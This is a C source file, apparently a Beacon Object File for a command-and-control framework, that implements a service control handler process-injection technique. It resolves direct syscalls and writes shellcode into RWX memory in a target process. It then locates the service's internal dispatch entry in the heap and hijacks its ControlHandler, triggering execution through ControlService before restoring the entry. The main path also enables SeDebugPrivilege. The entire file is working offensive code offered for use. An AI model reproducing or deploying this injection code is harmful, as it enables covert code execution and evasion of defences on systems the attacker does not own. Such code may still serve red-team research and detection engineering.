#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <wbemcli.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"




typedef struct _INTERNAL_DISPATCH_ENTRY_LEGACY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    ULONG_PTR               ServiceFlags;
    ULONG_PTR               Tag;
    HANDLE                  MainThreadHandle;
    ULONG_PTR               dwReserved;
} INTERNAL_DISPATCH_ENTRY_LEGACY, *PINTERNAL_DISPATCH_ENTRY_LEGACY;

typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPWSTR                  ServiceName2;       // Windows 10
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    ULONG_PTR               ServiceFlags;        // 64-bit on windows 10
    ULONG_PTR               Tag;
    HANDLE                  MainThreadHandle;
    ULONG_PTR               dwReserved;
    ULONG_PTR               dwReserved2;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;



DWORD svcctrl(PROCESS_INFORMATION* lpProcessInfo, LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    PHMOD hNTDLL = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtQueryVirtualMemory_t NtQueryVirtualMemory = NULL;
    NtReadVirtualMemory_t NtReadVirtualMemory = NULL;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = NULL;
    NtFreeVirtualMemory_t NtFreeVirtualMemory = NULL;
    SIZE_T dwReturnLength = 0;
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS serviceStatus;
    INTERNAL_DISPATCH_ENTRY ideOriginal;
    INTERNAL_DISPATCH_ENTRY_LEGACY ideOriginal_legacy;
    LPBYTE lpIdeOriginal = NULL;
    SIZE_T dwIdeOriginalSize = 0;
    INTERNAL_DISPATCH_ENTRY ideNew;
    INTERNAL_DISPATCH_ENTRY_LEGACY ideNew_legacy;
    LPBYTE lpIdeNew = NULL;
    SIZE_T dwIdeNewSize = 0;    
    LPVOID lpIdeAddress; 
    LPVOID lpRemoteShellcodeBuffer = NULL;
    SYSTEM_INFO systemInfo;
    LPBYTE lpCurrentAddress = NULL;
    WCHAR swzServiceName[MAX_PATH];
    WCHAR swzServiceRealName[MAX_PATH];
    BOOL bFound = FALSE;
    
 /*
    internal_printf("hThread:               %p\n", lpProcessInfo->hThread);
    internal_printf("hProcess:              %p\n", lpProcessInfo->hProcess);
    internal_printf("dwProcessId:           %u\n", lpProcessInfo->dwProcessId);
    internal_printf("dwThreadId:            %u\n", lpProcessInfo->dwThreadId);
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetSyscallStub(hNTDLL, "NtQueryVirtualMemory");
    NtReadVirtualMemory = (NtReadVirtualMemory_t)GetSyscallStub(hNTDLL, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    if ((NULL == NtAllocateVirtualMemory) || 
        (NULL == NtQueryVirtualMemory) || 
        (NULL == NtReadVirtualMemory) || 
        (NULL == NtWriteVirtualMemory) || 
        (NULL == NtFreeVirtualMemory) 
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate remote shellcode buffer
    dwReturnLength = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        lpProcessInfo->hProcess, 
        &lpRemoteShellcodeBuffer, 
        0, 
        &dwReturnLength, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpRemoteShellcodeBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        &dwReturnLength
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get memory info
    intZeroMemory(&systemInfo, sizeof(systemInfo));
    KERNEL32$GetSystemInfo(&systemInfo);
    
    // Loop through the whole address space and try to find legacy IDE
    //internal_printf("Trying to look for legacy IDE...\n");
    for (lpCurrentAddress=(LPBYTE)systemInfo.lpMinimumApplicationAddress; lpCurrentAddress < (LPBYTE)systemInfo.lpMaximumApplicationAddress;)
    {
        MEMORY_BASIC_INFORMATION mbiCurrentBlock;

        intZeroMemory(&mbiCurrentBlock, sizeof(mbiCurrentBlock));
        dwErrorCode = NtQueryVirtualMemory(
            lpProcessInfo->hProcess, 
            lpCurrentAddress,
            MemoryBasicInformation, 
            &mbiCurrentBlock, 
            sizeof(mbiCurrentBlock), 
            &dwReturnLength
        );
        if ( STATUS_SUCCESS != dwErrorCode )
        {
            continue;
        }

        // we only want to scan the heap, but this will scan stack space too.
        if ((MEM_COMMIT == mbiCurrentBlock.State)  &&
            (MEM_PRIVATE == mbiCurrentBlock.Type) && 
            (PAGE_READWRITE == mbiCurrentBlock.Protect)) 
        {
            bFound = FALSE;
            LPBYTE lpCurrentBlock = mbiCurrentBlock.BaseAddress;
            DWORD dwIndex = 0;

            // Scan memory block for IDE
            for (dwIndex = 0; dwIndex<=(mbiCurrentBlock.RegionSize-sizeof(ideOriginal_legacy)); dwIndex+=sizeof(ULONG_PTR))
            {
                MEMORY_BASIC_INFORMATION mbiCurrentIDE;

                intZeroMemory(&ideOriginal_legacy, sizeof(ideOriginal_legacy));

                // Read in current buffer as if it were an internal dispatch entry
                dwErrorCode = NtReadVirtualMemory(
                    lpProcessInfo->hProcess, 
                    &lpCurrentBlock[dwIndex], 
                    &ideOriginal_legacy, 
                    sizeof(ideOriginal_legacy), 
                    &dwReturnLength
                );
                if ( STATUS_SUCCESS != dwErrorCode )
                {
                    continue;
                }
                if (dwReturnLength != sizeof(ideOriginal_legacy))
                {
                    continue;
                }
                
                // These values should not be empty
                if (   (NULL == ideOriginal_legacy.ServiceName)
                    || (NULL == ideOriginal_legacy.ServiceRealName)
                    || (NULL == ideOriginal_legacy.ServiceStartRoutine)
                    || (NULL == ideOriginal_legacy.ControlHandler)
                    || (NULL == ideOriginal_legacy.MainThreadHandle)
                ) continue;

                // These string pointers should be equal
                if (ideOriginal_legacy.ServiceName != ideOriginal_legacy.ServiceRealName) continue;
                
                // The service flags should not exceed 128
                if (128 < ideOriginal_legacy.ServiceFlags) continue;
                
                // Sanity check of main thread handle
                if ((HANDLE)0xFFFF < ideOriginal_legacy.MainThreadHandle) continue;
                
                // The start routine should reside in executable memory
                intZeroMemory(&mbiCurrentIDE, sizeof(mbiCurrentIDE));
                dwErrorCode = NtQueryVirtualMemory(
                    lpProcessInfo->hProcess, 
                    ideOriginal_legacy.ServiceStartRoutine,
                    MemoryBasicInformation, 
                    &mbiCurrentIDE, 
                    sizeof(mbiCurrentIDE), 
                    &dwReturnLength
                );
                if ( STATUS_SUCCESS != dwErrorCode )
                {
                    continue;
                }
                if (dwReturnLength != sizeof(mbiCurrentIDE)) continue;
                if (!(mbiCurrentIDE.Protect & PAGE_EXECUTE_READ)) continue;

                // The control handler should reside in executable memory
                intZeroMemory(&mbiCurrentIDE, sizeof(mbiCurrentIDE));
                dwErrorCode = NtQueryVirtualMemory(
                    lpProcessInfo->hProcess, 
                    ideOriginal_legacy.ControlHandler,
                    MemoryBasicInformation, 
                    &mbiCurrentIDE, 
                    sizeof(mbiCurrentIDE), 
                    &dwReturnLength
                );
                if ( STATUS_SUCCESS != dwErrorCode )
                {
                    continue;
                }
                if (dwReturnLength != sizeof(mbiCurrentIDE)) continue;
                if (!(mbiCurrentIDE.Protect & PAGE_EXECUTE_READ)) continue;
                
                // Try to get the service name 
                intZeroMemory(swzServiceName, sizeof(swzServiceName));
                dwErrorCode = NtReadVirtualMemory(
                    lpProcessInfo->hProcess, 
                    ideOriginal_legacy.ServiceName, 
                    swzServiceName, 
                    MAX_PATH, 
                    &dwReturnLength
                );
                if ( STATUS_SUCCESS != dwErrorCode )
                {
                    continue;
                }

                //internal_printf("swzServiceName: %S\n", swzServiceName);
                
                // Try to get the service real name
                intZeroMemory(swzServiceRealName, sizeof(swzServiceRealName));
                dwErrorCode = NtReadVirtualMemory(
                    lpProcessInfo->hProcess, 
                    ideOriginal_legacy.ServiceRealName, 
                    swzServiceRealName, 
                    MAX_PATH, 
                    &dwReturnLength
                );
                if ( STATUS_SUCCESS != dwErrorCode )
                {
                    continue;
                }

                //internal_printf("swzServiceRealName: %S\n", swzServiceRealName);

                // Save the address of IDE
                lpIdeAddress = lpCurrentBlock + dwIndex;

                bFound = TRUE;
                lpIdeOriginal = (LPBYTE)&ideOriginal_legacy;
                dwIdeOriginalSize = sizeof(ideOriginal_legacy);                    
                lpIdeNew = (LPBYTE)&ideNew_legacy;
                dwIdeNewSize = sizeof(ideNew_legacy);
                intZeroMemory(&ideNew_legacy, sizeof(ideNew_legacy));
                MSVCRT$memcpy(lpIdeNew, lpIdeOriginal, dwIdeOriginalSize);
                ideNew_legacy.ControlHandler = lpRemoteShellcodeBuffer;
                ideNew_legacy.ServiceFlags = SERVICE_CONTROL_INTERROGATE;
                break;
            }

            if (bFound) break;
        }
        lpCurrentAddress = (PBYTE)mbiCurrentBlock.BaseAddress + mbiCurrentBlock.RegionSize;
    }

    if(FALSE == bFound)
    {
        //internal_printf("FindServiceIDE failed to find legacy IDE.\n");
        //internal_printf("Trying to look for modern IDE...\n");

        // Loop through the whole address space and try to find modern IDE
        for (lpCurrentAddress=(LPBYTE)systemInfo.lpMinimumApplicationAddress; lpCurrentAddress < (LPBYTE)systemInfo.lpMaximumApplicationAddress;)
        {
            MEMORY_BASIC_INFORMATION mbiCurrentBlock;

            intZeroMemory(&mbiCurrentBlock, sizeof(mbiCurrentBlock));
            dwErrorCode = NtQueryVirtualMemory(
                lpProcessInfo->hProcess, 
                lpCurrentAddress,
                MemoryBasicInformation, 
                &mbiCurrentBlock, 
                sizeof(mbiCurrentBlock), 
                &dwReturnLength
            );
            if ( STATUS_SUCCESS != dwErrorCode )
            {
                continue;
            }

            // we only want to scan the heap, but this will scan stack space too.
            if ((MEM_COMMIT == mbiCurrentBlock.State)  &&
                (MEM_PRIVATE == mbiCurrentBlock.Type) && 
                (PAGE_READWRITE == mbiCurrentBlock.Protect)) 
            {
                bFound = FALSE;
                LPBYTE lpCurrentBlock = mbiCurrentBlock.BaseAddress;
                DWORD dwIndex = 0;

                // Scan memory block for IDE
                for (dwIndex = 0; dwIndex<=(mbiCurrentBlock.RegionSize-sizeof(ideOriginal)); dwIndex+=sizeof(ULONG_PTR))
                {
                    MEMORY_BASIC_INFORMATION mbiCurrentIDE;

                    intZeroMemory(&ideOriginal, sizeof(ideOriginal));

                    // Read in current buffer as if it were an internal dispatch entry
                    dwErrorCode = NtReadVirtualMemory(
                        lpProcessInfo->hProcess, 
                        &lpCurrentBlock[dwIndex], 
                        &ideOriginal, 
                        sizeof(ideOriginal), 
                        &dwReturnLength
                    );
                    if ( STATUS_SUCCESS != dwErrorCode )
                    {
                        continue;
                    }
                    if (dwReturnLength != sizeof(ideOriginal))
                    {
                        continue;
                    }
                    
                    // These values should not be empty
                    if (    (NULL == ideOriginal.ServiceName)
                        || (NULL == ideOriginal.ServiceRealName)
                        || (NULL == ideOriginal.ServiceStartRoutine)
                        || (NULL == ideOriginal.ControlHandler)
                        || (NULL == ideOriginal.MainThreadHandle)
                    ) continue;

                    // These string pointers should be equal
                    if (ideOriginal.ServiceName != ideOriginal.ServiceRealName) continue;
                    
                    // The service flags should not exceed 128
                    if (128 < ideOriginal.ServiceFlags) continue;
                    
                    // Sanity check of main thread handle
                    if ((HANDLE)0xFFFF < ideOriginal.MainThreadHandle) continue;
                    
                    // The start routine should reside in executable memory
                    intZeroMemory(&mbiCurrentIDE, sizeof(mbiCurrentIDE));
                    dwErrorCode = NtQueryVirtualMemory(
                        lpProcessInfo->hProcess, 
                        ideOriginal.ServiceStartRoutine,
                        MemoryBasicInformation, 
                        &mbiCurrentIDE, 
                        sizeof(mbiCurrentIDE), 
                        &dwReturnLength
                    );
                    if ( STATUS_SUCCESS != dwErrorCode )
                    {
                        continue;
                    }
                    if (dwReturnLength != sizeof(mbiCurrentIDE)) continue;
                    if (!(mbiCurrentIDE.Protect & PAGE_EXECUTE_READ)) continue;

                    // The control handler should reside in executable memory
                    intZeroMemory(&mbiCurrentIDE, sizeof(mbiCurrentIDE));
                    dwErrorCode = NtQueryVirtualMemory(
                        lpProcessInfo->hProcess, 
                        ideOriginal.ControlHandler,
                        MemoryBasicInformation, 
                        &mbiCurrentIDE, 
                        sizeof(mbiCurrentIDE), 
                        &dwReturnLength
                    );
                    if ( STATUS_SUCCESS != dwErrorCode )
                    {
                        continue;
                    }
                    if (dwReturnLength != sizeof(mbiCurrentIDE)) continue;
                    if (!(mbiCurrentIDE.Protect & PAGE_EXECUTE_READ)) continue;
                    
                    // Try to get the service name 
                    intZeroMemory(swzServiceName, sizeof(swzServiceName));
                    dwErrorCode = NtReadVirtualMemory(
                        lpProcessInfo->hProcess, 
                        ideOriginal.ServiceName, 
                        swzServiceName, 
                        MAX_PATH, 
                        &dwReturnLength
                    );
                    if ( STATUS_SUCCESS != dwErrorCode )
                    {
                        continue;
                    }

                    //internal_printf("swzServiceName: %S\n", swzServiceName);
                    
                    // Try to get the service real name
                    intZeroMemory(swzServiceRealName, sizeof(swzServiceRealName));
                    dwErrorCode = NtReadVirtualMemory(
                        lpProcessInfo->hProcess, 
                        ideOriginal.ServiceRealName, 
                        swzServiceRealName, 
                        MAX_PATH, 
                        &dwReturnLength
                    );
                    if ( STATUS_SUCCESS != dwErrorCode )
                    {
                        continue;
                    }

                    //internal_printf("swzServiceRealName: %S\n", swzServiceRealName);

                    // Save the address of IDE
                    lpIdeAddress = lpCurrentBlock + dwIndex;

                    bFound = TRUE;
                    lpIdeOriginal = (LPBYTE)&ideOriginal;
                    dwIdeOriginalSize = sizeof(ideOriginal);
                    lpIdeNew = (LPBYTE)&ideNew;
                    dwIdeNewSize = sizeof(ideNew);
                    intZeroMemory(&ideNew, sizeof(ideNew));
                    MSVCRT$memcpy(lpIdeNew, lpIdeOriginal, dwIdeOriginalSize);
                    ideNew.ControlHandler = lpRemoteShellcodeBuffer;
                    ideNew.ServiceFlags = SERVICE_CONTROL_INTERROGATE;
                    break;
                }

                if (bFound) break;
            }
            lpCurrentAddress = (PBYTE)mbiCurrentBlock.BaseAddress + mbiCurrentBlock.RegionSize;
        }        

        if(FALSE == bFound)
        {
            dwErrorCode = ERROR_SERVICE_NOT_FOUND;
            internal_printf("FindServiceIDE failed (%lu)\n", dwErrorCode);
            goto end;
        } // end if did not find legacy IDE
    } // end if did not find modern IDE

    internal_printf("Found a service IDE for %S\n", swzServiceName);

    // Open the service control manager
    hSCManager = ADVAPI32$OpenSCManagerW(
        NULL, 
        NULL, 
        SC_MANAGER_CONNECT
    );
    if (NULL == hSCManager)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("OpenSCManagerW failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Open the target service
    hService = ADVAPI32$OpenServiceW(
        hSCManager, 
        swzServiceName, 
        SERVICE_INTERROGATE
    );
    if (NULL == hService)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("OpenServiceW failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Write the new IDE to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpIdeAddress, 
        lpIdeNew, 
        dwIdeNewSize, 
        &dwReturnLength
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Trigger the new ControlHandler by calling ControlService
    if (FALSE == ADVAPI32$ControlService(hService, SERVICE_CONTROL_INTERROGATE, &serviceStatus))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("ControlService failed (%lu)\n", dwErrorCode);
        goto end;
    }

    KERNEL32$Sleep(10);

    // Restore the original IDE
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpIdeAddress, 
        lpIdeOriginal, 
        dwIdeOriginalSize, 
        &dwReturnLength
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

end:

    // Free remote shellcode?
    /*
    if (lpRemoteShellcodeBuffer)
    {
        NtFreeVirtualMemory(
            lpProcessInfo->hProcess, 
            lpRemoteShellcodeBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteShellcodeBuffer = NULL;
    }
    */
    
    if (hService)
    {
        ADVAPI32$CloseServiceHandle(hService);
        hService = NULL;
    }
    
    if (hSCManager)
    {
        ADVAPI32$CloseServiceHandle(hSCManager);
        hSCManager = NULL;
    }

    if (NtAllocateVirtualMemory)
    {
        KERNEL32$VirtualFree(NtAllocateVirtualMemory, 0, MEM_RELEASE);
        NtAllocateVirtualMemory = NULL;
    }

    if (NtQueryVirtualMemory)
    {
        KERNEL32$VirtualFree(NtQueryVirtualMemory, 0, MEM_RELEASE);
        NtQueryVirtualMemory = NULL;
    }

    if (NtReadVirtualMemory)
    {
        KERNEL32$VirtualFree(NtReadVirtualMemory, 0, MEM_RELEASE);
        NtReadVirtualMemory = NULL;
    }

    if (NtWriteVirtualMemory)
    {
        KERNEL32$VirtualFree(NtWriteVirtualMemory, 0, MEM_RELEASE);
        NtWriteVirtualMemory = NULL;
    }

    if (NtFreeVirtualMemory)
    {
        KERNEL32$VirtualFree(NtFreeVirtualMemory, 0, MEM_RELEASE);
        NtFreeVirtualMemory = NULL;
    }

    if (hNTDLL)
    {
        _FreeLibrary(hNTDLL);
        hNTDLL = NULL;
    }

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Get the arguments <PID> <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    dwPid = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Get a handle to the injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("svcctrl( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = svcctrl(
        &processInfo,
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "svcctrl failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Check to see if we received any arguments
    if (3 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <SERVICE> <SHELLCODE>\n", argv[0]);
        goto end;
    }

    // Get the arguments <PID> <SHELLCODE>
    dwPid = atoi(argv[1]);
    if (USHRT_MAX < dwPid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PID: %s\n", argv[1]);
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }
    
    dwErrorCode = ReadFileIntoBuffer(argv[2], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Request privileges (this is done via script in BOF)
    internal_printf("SetPrivilege(SE_DEBUG_NAME)...\n");
    dwErrorCode = SetPrivilege(NULL, SE_DEBUG_NAME, TRUE);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "SetPrivilege failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to our injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("svcctrl( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = svcctrl(
        &processInfo,
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "svcctrl failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    if (lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
